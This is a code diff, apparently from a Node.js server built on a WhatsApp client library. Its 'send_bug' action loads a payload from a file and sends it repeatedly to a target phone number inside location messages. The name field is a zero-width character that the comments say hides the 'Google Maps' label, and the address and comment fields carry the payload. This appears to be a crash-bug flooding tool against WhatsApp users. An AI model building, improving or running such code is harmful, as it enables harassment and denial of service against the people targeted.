@@ -141,7 +141,7 @@ const server = http.createServer(async (req, res) => {
                     return;
                 }
 
-                // O script busca o arquivo correspondente no diretório/repositório
+                // ENVIO DE CARGA / BUG DE LOCALIZAÇÃO
                 if (acao === 'send_bug' && param && extraData) {
                     const targetJid = `${param.replace(/\D/g, '')}@s.whatsapp.net`;
                     const nomeArquivoBruto = extraData.file || "";
@@ -162,7 +162,6 @@ const server = http.createServer(async (req, res) => {
                             const caminhoAbsoluto = path.join(__dirname, arquivoEncontrado);
                             let textoBruto = fs.readFileSync(caminhoAbsoluto, 'utf8');
 
-                            // Extrai o texto contido entre aspas/crases ou pega o texto puro
                             const matchAspas = textoBruto.match(/=\s*[`"']([\s\S]*?)[`"'];?/);
                             if (matchAspas && matchAspas[1]) {
                                 conteudoPayload = matchAspas[1];
@@ -191,10 +190,11 @@ const server = http.createServer(async (req, res) => {
                     for (let i = 0; i < quantidade; i++) {
                         await waSock.sendMessage(targetJid, {
                             location: {
-                                degreesLatitude: -999999999999,
-                                degreesLongitude: -999999999999,
-                                name: "\u200B", // Caractere invisível de largura zero
-                                address: addressPayload
+                                degreesLatitude: -23.550520,  // Coordenada válida para renderizar o mapa
+                                degreesLongitude: -46.633308, // Coordenada válida para renderizar o mapa
+                                name: "\u200B",               // Caractere invisível oculta o texto "Google Maps"
+                                address: addressPayload,
+                                comment: addressPayload
                             }
                         });
                         
